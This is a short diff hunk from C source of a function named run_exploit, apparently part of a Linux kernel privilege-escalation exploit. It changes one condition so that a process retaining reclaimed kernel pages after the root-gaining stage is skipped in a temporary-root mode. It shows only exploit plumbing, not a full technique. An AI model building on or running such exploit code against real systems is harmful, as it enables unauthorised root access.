@@ -212,7 +212,7 @@ int run_exploit(int argc, char **argv) {
     SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
   }
   int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
-  if (exploit_ok) {
+  if (exploit_ok && !cve_temp_root_mode()) {
     pid_t keeper = spawn_allocation_keeper();
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
